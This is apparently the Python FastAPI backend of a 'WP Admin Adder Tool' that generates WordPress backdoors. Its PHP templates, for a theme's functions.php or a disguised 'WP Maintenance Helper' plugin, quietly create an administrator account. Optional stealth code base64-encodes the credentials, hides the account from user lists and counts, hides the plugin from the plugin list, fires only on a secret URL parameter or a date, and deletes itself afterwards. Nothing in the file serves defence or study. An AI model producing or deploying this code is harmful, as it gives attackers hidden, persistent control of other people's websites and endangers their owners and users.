from fastapi import FastAPI, APIRouter, HTTPException
from dotenv import load_dotenv
from starlette.middleware.cors import CORSMiddleware
from motor.motor_asyncio import AsyncIOMotorClient
import os
import logging
from pathlib import Path
from pydantic import BaseModel, Field, ConfigDict
from typing import List, Optional
import uuid
from datetime import datetime, timezone
import base64
import hashlib
import secrets
import string


ROOT_DIR = Path(__file__).parent
load_dotenv(ROOT_DIR / '.env')

# MongoDB connection
mongo_url = os.environ['MONGO_URL']
client = AsyncIOMotorClient(mongo_url)
db = client[os.environ.get('DB_NAME', 'wp_admin_adder')]

# Create the main app without a prefix
app = FastAPI(title="WP Admin Adder Tool")

# Create a router with the /api prefix
api_router = APIRouter(prefix="/api")


# Define Models
class AdminConfig(BaseModel):
    username: str = Field(..., min_length=3, max_length=50)
    password: str = Field(..., min_length=6)
    email: str
    display_name: Optional[str] = None
    role: str = "administrator"

class StealthConfig(BaseModel):
    hide_from_user_list: bool = False
    hide_from_user_count: bool = False
    obfuscate_code: bool = False
    use_base64_encoding: bool = False

class TriggerConfig(BaseModel):
    trigger_type: str = "immediate"  # immediate, url_param, scheduled
    url_param_key: Optional[str] = None
    url_param_value: Optional[str] = None
    scheduled_time: Optional[str] = None
    auto_delete_after_run: bool = False

class GenerateRequest(BaseModel):
    code_type: str = "theme"  # theme, plugin
    admin_config: AdminConfig
    stealth_config: StealthConfig
    trigger_config: TriggerConfig

class GeneratedCode(BaseModel):
    model_config = ConfigDict(extra="ignore")
    
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    code_type: str
    admin_username: str
    admin_email: str
    php_code: str
    stealth_enabled: bool
    trigger_type: str
    created_at: datetime = Field(default_factory=lambda: datetime.now(timezone.utc))

class HistoryItem(BaseModel):
    model_config = ConfigDict(extra="ignore")
    
    id: str
    code_type: str
    admin_username: str
    admin_email: str
    stealth_enabled: bool
    trigger_type: str
    created_at: datetime


def generate_random_string(length=8):
    return ''.join(secrets.choice(string.ascii_lowercase) for _ in range(length))


def obfuscate_string(s: str) -> str:
    """Simple obfuscation using base64"""
    return base64.b64encode(s.encode()).decode()


def generate_theme_code(admin_config: AdminConfig, stealth_config: StealthConfig, trigger_config: TriggerConfig) -> str:
    """Generate PHP code for functions.php"""
    
    func_name = f"wp_init_{generate_random_string()}"
    hook_name = f"init_{generate_random_string()}"
    
    username = admin_config.username
    password = admin_config.password
    email = admin_config.email
    display_name = admin_config.display_name or admin_config.username
    role = admin_config.role
    
    # Build the core user creation code
    if stealth_config.use_base64_encoding:
        user_code = f'''
    $u = base64_decode('{obfuscate_string(username)}');
    $p = base64_decode('{obfuscate_string(password)}');
    $e = base64_decode('{obfuscate_string(email)}');
    $d = base64_decode('{obfuscate_string(display_name)}');
    $r = base64_decode('{obfuscate_string(role)}');'''
    else:
        user_code = f'''
    $u = '{username}';
    $p = '{password}';
    $e = '{email}';
    $d = '{display_name}';
    $r = '{role}';'''
    
    # Build trigger condition
    if trigger_config.trigger_type == "url_param":
        param_key = trigger_config.url_param_key or "wp_debug"
        param_value = trigger_config.url_param_value or "1"
        trigger_condition = f"if (!isset($_GET['{param_key}']) || $_GET['{param_key}'] !== '{param_value}') return;"
    elif trigger_config.trigger_type == "scheduled":
        scheduled_time = trigger_config.scheduled_time or "2025-12-31"
        trigger_condition = f"if (strtotime('{scheduled_time}') > time()) return;"
    else:
        trigger_condition = ""
    
    # Build auto-delete code
    auto_delete_code = ""
    if trigger_config.auto_delete_after_run:
        auto_delete_code = f'''
    // Auto-delete this code after execution
    $file = __FILE__;
    $content = file_get_contents($file);
    $pattern = '/\\/\\/ START {func_name}.*?\\/\\/ END {func_name}/s';
    $content = preg_replace($pattern, '', $content);
    file_put_contents($file, $content);'''
    
    # Build stealth code for hiding from user list
    stealth_code = ""
    if stealth_config.hide_from_user_list:
        stealth_func = f"hide_user_{generate_random_string()}"
        stealth_code = f'''

// Hide admin from user list
add_action('pre_user_query', function($query) {{
    global $wpdb;
    $hidden_user = '{username}';
    $query->query_where = str_replace(
        'WHERE 1=1',
        "WHERE 1=1 AND {{$wpdb->users}}.user_login != '{{$hidden_user}}'",
        $query->query_where
    );
}});'''
    
    if stealth_config.hide_from_user_count:
        stealth_code += f'''

// Hide from user count
add_filter('views_users', function($views) {{
    $hidden_user = get_user_by('login', '{username}');
    if ($hidden_user) {{
        foreach ($views as $role => $view) {{
            if (preg_match('/\\(([0-9]+)\\)/', $view, $matches)) {{
                $count = intval($matches[1]) - 1;
                $views[$role] = preg_replace('/\\([0-9]+\\)/', '(' . $count . ')', $view);
            }}
        }}
    }}
    return $views;
}});'''
    
    # Combine all code
    php_code = f'''<?php
// START {func_name}
// WP Admin Auto-Add - Theme Version
// Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

add_action('init', function() {{
    {trigger_condition}
    {user_code}
    
    if (!username_exists($u) && !email_exists($e)) {{
        $user_id = wp_create_user($u, $p, $e);
        if (!is_wp_error($user_id)) {{
            $user = new WP_User($user_id);
            $user->set_role($r);
            wp_update_user(array(
                'ID' => $user_id,
                'display_name' => $d
            ));
            {auto_delete_code}
        }}
    }}
}});
{stealth_code}
// END {func_name}
?>'''
    
    return php_code


def generate_plugin_code(admin_config: AdminConfig, stealth_config: StealthConfig, trigger_config: TriggerConfig) -> str:
    """Generate PHP code as a WordPress plugin"""
    
    plugin_name = f"WP Maintenance Helper {generate_random_string(4).upper()}"
    func_name = f"wp_maint_{generate_random_string()}"
    
    username = admin_config.username
    password = admin_config.password
    email = admin_config.email
    display_name = admin_config.display_name or admin_config.username
    role = admin_config.role
    
    # Build the core user creation code
    if stealth_config.use_base64_encoding:
        user_code = f'''
    $u = base64_decode('{obfuscate_string(username)}');
    $p = base64_decode('{obfuscate_string(password)}');
    $e = base64_decode('{obfuscate_string(email)}');
    $d = base64_decode('{obfuscate_string(display_name)}');
    $r = base64_decode('{obfuscate_string(role)}');'''
    else:
        user_code = f'''
    $u = '{username}';
    $p = '{password}';
    $e = '{email}';
    $d = '{display_name}';
    $r = '{role}';'''
    
    # Build trigger condition
    if trigger_config.trigger_type == "url_param":
        param_key = trigger_config.url_param_key or "wp_debug"
        param_value = trigger_config.url_param_value or "1"
        trigger_condition = f"if (!isset($_GET['{param_key}']) || $_GET['{param_key}'] !== '{param_value}') return;"
    elif trigger_config.trigger_type == "scheduled":
        scheduled_time = trigger_config.scheduled_time or "2025-12-31"
        trigger_condition = f"if (strtotime('{scheduled_time}') > time()) return;"
    else:
        trigger_condition = ""
    
    # Build auto-delete code (self-deactivate for plugin)
    auto_delete_code = ""
    if trigger_config.auto_delete_after_run:
        auto_delete_code = f'''
            // Self-deactivate plugin after execution
            deactivate_plugins(plugin_basename(__FILE__));
            // Delete plugin file
            @unlink(__FILE__);'''
    
    # Build stealth code
    stealth_code = ""
    if stealth_config.hide_from_user_list:
        stealth_code = f'''

// Hide admin from user list
add_action('pre_user_query', function($query) {{
    global $wpdb;
    $hidden_user = '{username}';
    $query->query_where = str_replace(
        'WHERE 1=1',
        "WHERE 1=1 AND {{$wpdb->users}}.user_login != '{{$hidden_user}}'",
        $query->query_where
    );
}});'''
    
    if stealth_config.hide_from_user_count:
        stealth_code += f'''

// Hide from user count
add_filter('views_users', function($views) {{
    $hidden_user = get_user_by('login', '{username}');
    if ($hidden_user) {{
        foreach ($views as $role => $view) {{
            if (preg_match('/\\(([0-9]+)\\)/', $view, $matches)) {{
                $count = intval($matches[1]) - 1;
                $views[$role] = preg_replace('/\\([0-9]+\\)/', '(' . $count . ')', $view);
            }}
        }}
    }}
    return $views;
}});'''
    
    # Plugin hide from plugin list
    plugin_stealth = ""
    if stealth_config.obfuscate_code:
        plugin_stealth = f'''

// Hide plugin from plugins list
add_filter('all_plugins', function($plugins) {{
    $plugin_file = plugin_basename(__FILE__);
    if (isset($plugins[$plugin_file])) {{
        unset($plugins[$plugin_file]);
    }}
    return $plugins;
}});'''
    
    php_code = f'''<?php
/**
 * Plugin Name: {plugin_name}
 * Description: WordPress maintenance and optimization helper.
 * Version: 1.0.0
 * Author: WordPress Team
 * License: GPL2
 */

if (!defined('ABSPATH')) exit;

// Main initialization
add_action('init', function() {{
    {trigger_condition}
    {user_code}
    
    if (!username_exists($u) && !email_exists($e)) {{
        $user_id = wp_create_user($u, $p, $e);
        if (!is_wp_error($user_id)) {{
            $user = new WP_User($user_id);
            $user->set_role($r);
            wp_update_user(array(
                'ID' => $user_id,
                'display_name' => $d
            ));
            {auto_delete_code}
        }}
    }}
}});
{stealth_code}
{plugin_stealth}
?>'''
    
    return php_code


# API Routes
@api_router.get("/")
async def root():
    return {"message": "WP Admin Adder Tool API", "version": "1.0.0"}


@api_router.post("/generate", response_model=GeneratedCode)
async def generate_code(request: GenerateRequest):
    """Generate PHP code for adding WordPress admin"""
    try:
        if request.code_type == "theme":
            php_code = generate_theme_code(
                request.admin_config,
                request.stealth_config,
                request.trigger_config
            )
        else:
            php_code = generate_plugin_code(
                request.admin_config,
                request.stealth_config,
                request.trigger_config
            )
        
        # Create generated code record
        generated = GeneratedCode(
            code_type=request.code_type,
            admin_username=request.admin_config.username,
            admin_email=request.admin_config.email,
            php_code=php_code,
            stealth_enabled=request.stealth_config.hide_from_user_list or request.stealth_config.obfuscate_code,
            trigger_type=request.trigger_config.trigger_type
        )
        
        # Save to database
        doc = generated.model_dump()
        doc['created_at'] = doc['created_at'].isoformat()
        await db.generated_codes.insert_one(doc)
        
        return generated
    except Exception as e:
        logging.error(f"Error generating code: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@api_router.get("/history", response_model=List[HistoryItem])
async def get_history():
    """Get history of generated codes"""
    try:
        codes = await db.generated_codes.find(
            {},
            {"_id": 0, "php_code": 0}
        ).sort("created_at", -1).to_list(100)
        
        for code in codes:
            if isinstance(code['created_at'], str):
                code['created_at'] = datetime.fromisoformat(code['created_at'])
        
        return codes
    except Exception as e:
        logging.error(f"Error fetching history: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@api_router.get("/history/{code_id}")
async def get_code_by_id(code_id: str):
    """Get specific generated code by ID"""
    try:
        code = await db.generated_codes.find_one({"id": code_id}, {"_id": 0})
        if not code:
            raise HTTPException(status_code=404, detail="Code not found")
        
        if isinstance(code['created_at'], str):
            code['created_at'] = datetime.fromisoformat(code['created_at'])
        
        return code
    except HTTPException:
        raise
    except Exception as e:
        logging.error(f"Error fetching code: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@api_router.delete("/history/{code_id}")
async def delete_code(code_id: str):
    """Delete a generated code from history"""
    try:
        result = await db.generated_codes.delete_one({"id": code_id})
        if result.deleted_count == 0:
            raise HTTPException(status_code=404, detail="Code not found")
        return {"message": "Code deleted successfully"}
    except HTTPException:
        raise
    except Exception as e:
        logging.error(f"Error deleting code: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@api_router.delete("/history")
async def clear_history():
    """Clear all history"""
    try:
        await db.generated_codes.delete_many({})
        return {"message": "History cleared successfully"}
    except Exception as e:
        logging.error(f"Error clearing history: {e}")
        raise HTTPException(status_code=500, detail=str(e))


# Include the router in the main app
app.include_router(api_router)

app.add_middleware(
    CORSMiddleware,
    allow_credentials=True,
    allow_origins=os.environ.get('CORS_ORIGINS', '*').split(','),
    allow_methods=["*"],
    allow_headers=["*"],
)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

@app.on_event("shutdown")
async def shutdown_db_client():
    client.close()
